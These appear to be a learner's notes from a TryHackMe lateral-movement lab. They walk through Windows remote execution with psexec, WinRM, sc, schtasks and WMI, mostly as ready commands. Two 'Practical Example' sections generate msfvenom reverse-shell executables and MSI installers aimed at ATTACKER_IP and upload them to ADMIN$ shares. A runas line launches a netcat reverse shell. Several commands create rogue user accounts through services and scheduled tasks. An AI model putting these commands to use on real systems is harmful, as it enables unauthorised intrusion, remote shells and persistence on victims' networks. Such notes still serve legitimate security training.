## Spawning Processes Remotely:

#### Psexec

Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded

- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### Remote Process Creation Using WinRM:

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Remote Management Users

To connect to a remote Powershell session from the command line, we can use the following command:

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

#### Remotely Creating Services Using sc

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

- Ports:
	- 135/TCP, 49152-65535/TCP (DCE/RPC)
	- 445/TCP (RPC over SMB Named Pipes)
	- 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators

We can create and start a service named "THMservice" using the following command:

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto

sc.exe \\TARGET start THMservice

# Additionally, we can stop and delete the service

sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation.

```
# Starting and running a scheduled task:

schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1"

# Deleting a scheduled task:

schtasks /S TARGET /TN "THMtask1" /DELETE /F

```

- /sc - schedule type (ONCE indicates that the task will run only once at the specified time and date)
- /sd - starting date
- /st - starting time

#### ==Practical Example==

1. Creating a reverse shell executable

```
$ msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

2. Upload exe to the ADMIN$ share using valid credentials and smbclient

```
smbclient -c 'put myservice.exe' -U <user> -W <domain> '//VICTIM_IP/admin$/' <password>
```

3. Setup a listener to receive reverse shell

```
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4444;exploit"
```

4.  Using currently comprimised victim machine to create a new service remotely by using sc, associating it with our uploaded exe

```
C:\> sc.exe \\VICTIM_IP create mal-service binPath= "%windir%\myservice.exe" start= auto

C:\> sc.exe \\VICTIM_IP start mal-service

# You will notice that you get access denied
# This is because sc.exe does not give us a way to input valid credentials for the target_machine
# We have to spawn a new command prompt as the user we have credentials for first
# Using runas to spawn a shell on a port we are listening on

Attacker Machine:
$ nc -nvlp 4443

Compromised Machine:
C:\> runas /netonly /user:DOMAIN\user.name "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

# Now we can create and start our service with our escalated shell
```

---

## Moving Laterally Using WMI:

#### Connecting to WMI From Powershell

WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

```powershell
# Creating PSCredential Object with our user and password
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
- Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

```powershell
# Establish a WMI session and storing it in $Session variable
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

#### Remote Process Creating Using WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Remotely spawning a process
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

#### Creating Services Remotely with WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Creating service "THMService2" with WMI
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Handle the service and start it
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stopping and deleting service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### Creating Schedule Tasks Remotely with WMI

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Creating and executing scheduled tasks
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Deleting scheduled task after use
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### Installing MSI Packages through WMI

What is MSI?

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

- Ports:
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

```powershell
# Installing MSI file
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

#### ==Practical Example==

1. Create a reverse shell MSI file

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi > myinstaller.msi
```

2. Upload the payload to the ADMIN$ share with smbclient and valid credentials

```
# Note: anything uploaded to the ADMIN$ share will be in C:\Windows\

$ smbclient -c 'put myinstaller.msi' -U <user> -W <domain> '//VICTIM_IP/admin$/' <pass>
```

3. Start listening on our declared port

```
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > run
```

4. Start a WMI session against our target machine

```powershell
PS C:\> $username = 'user.name';
PS C:\> $password = 'Password';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

5. Invoke the install method from the Win32_Product class to trigger payload

```powershell
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

